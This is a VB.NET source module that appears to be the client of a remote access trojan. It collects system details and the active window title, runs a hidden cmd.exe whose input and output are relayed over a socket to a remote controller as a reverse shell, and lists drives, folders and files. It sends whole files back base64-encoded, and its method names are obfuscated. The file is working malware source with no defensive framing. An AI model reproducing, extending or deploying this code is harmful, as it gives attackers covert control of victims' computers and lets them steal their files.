Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Module Module2
    Private Pro As Object
    Private RCC As SocketClient

    Sub Cdat()
        If My.Settings.InD = "." Then
            My.Settings.InD = My.Computer.Clock.LocalTime.ToString("dd/MM/yyyy")
            My.Settings.Save()
        End If
        Form1.ind = My.Settings.InD
    End Sub
    Public Function GOS() As String
        Return My.Computer.Info.OSFullName
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Function GetForegroundWindow() As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Function GetWindowText(hWnd As IntPtr, text As StringBuilder, count As Integer) As Integer
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Function GetWindowTextLength(hWnd As IntPtr) As Integer
    End Function
    Public Function GAW() As String
        Dim strTitle As String = String.Empty
        Dim handle As IntPtr = GetForegroundWindow()
        Dim intLength As Integer = GetWindowTextLength(handle) + 1
        Dim stringBuilder As New StringBuilder(intLength)
        If GetWindowText(handle, stringBuilder, intLength) > 0 Then
            strTitle = stringBuilder.ToString()
        End If
        Return strTitle
    End Function
    Function Now() As String
        Return My.Computer.Clock.LocalTime.ToString("dd/MM/yyyy hh:mm:ss")
    End Function
    Function GetSystemUpTime() As TimeSpan
        Try
            Dim uptime As PerformanceCounter = New PerformanceCounter("System", "System Up Time")
            uptime.NextValue()
            Return TimeSpan.FromSeconds(uptime.NextValue)
        Catch ex As Exception
            'handle the exception your way
            Return New TimeSpan(0, 0, 0, 0)
        End Try
    End Function
    Function GetSystemUpTimeInfo() As String
        Try
            Dim time As TimeSpan = GetSystemUpTime()
            Dim upTime As String = String.Format("{0:D2}h:{1:D2}m:{2:D2}s:{3:D3}ms", time.Hours, time.Minutes, time.Seconds, time.Milliseconds)
            Return String.Format("{0}", upTime)
        Catch ex As Exception
            'handle the exception your way
            Return String.Empty
        End Try
    End Function
    Function Is64() As String
        If Not String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")) Then
            Return "x64"
        Else
            Return "x86"
        End If
    End Function
    Public Function smethod_c(ByVal C As SocketClient) As Boolean
        Try
            Pro.Kill()
        Catch ex As Exception
            Console.WriteLine("Pro kill exception-->" + ex.Message)
        End Try
        Try
            RCC = C
            Pro = New Process
            Pro.StartInfo.RedirectStandardOutput = True
            Pro.StartInfo.RedirectStandardInput = True
            Pro.StartInfo.RedirectStandardError = True
            Pro.StartInfo.FileName = "cmd.exe"
            Pro.StartInfo.RedirectStandardError = True
            AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
            AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
            AddHandler CType(Pro, Process).Exited, AddressOf ex
            Pro.StartInfo.UseShellExecute = False
            Pro.StartInfo.CreateNoWindow = True
            Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            Pro.EnableRaisingEvents = True
            Pro.Start()
            Pro.BeginErrorReadLine()
            Pro.BeginOutputReadLine()
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Sub WriteRS(ByVal s As String)
        Pro.StandardInput.WriteLine(DEB(s))
    End Sub
    Public Sub CloseRS()
        Try
            Pro.Kill()
        Catch ex As Exception
        End Try
        Pro = Nothing
    End Sub
    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            RCC.Send("#" & Form1.Yy & "?" & Form1.Yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            RCC.Send("#" & Form1.Yy & "!!")
        Catch ex As Exception
        End Try
    End Sub
    Private Function smethod_a()
        Dim aD As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 0
                    aD += "[UN]" & d.Name & "FMSFMS"
                Case 2
                    aD += "[UB]" & d.Name & "FMSFMS"
                Case 3
                    aD += "[D]" & d.Name & "FMSFMS"
                Case 4
                    aD += "[ND]" & d.Name & "FMSFMS"
                Case 5
                    aD += "[CD]" & d.Name & "FMSFMS"
            End Select
        Next
        Return aD
    End Function
    Public Sub smethod_2(ByVal C As SocketClient)
        C.Send("$" & Form1.Yy & "!" & Form1.Yy & smethod_a())
    End Sub
    Public Function smethod_3(ByVal l) As String
        Try
            Dim di As New DirectoryInfo(l)
            Dim fd = ""
            For Each subdi As DirectoryInfo In di.GetDirectories
                fd += "[F]" & subdi.Name & "FMSFMS"
            Next
            Return fd
        Catch ex As Exception
            Return "un"
        End Try
    End Function
    Public Function smethod_4(ByVal l) As String
        Try
            Dim d As New System.IO.DirectoryInfo(l)
            Dim fs = ""
            For Each f As System.IO.FileInfo In d.GetFiles("*.*")
                fs += f.Name & "FMS" & f.Length.ToString & "FMS"
            Next
            Return fs
        Catch ex As Exception
            Return "un"
        End Try
    End Function
    Public Sub smethod_5(ByVal C As SocketClient, ByVal i As String)
        C.Send("$" & Form1.Yy & "vi" & Form1.Yy & Convert.ToBase64String(IO.File.ReadAllBytes(i)))
    End Sub
End Module
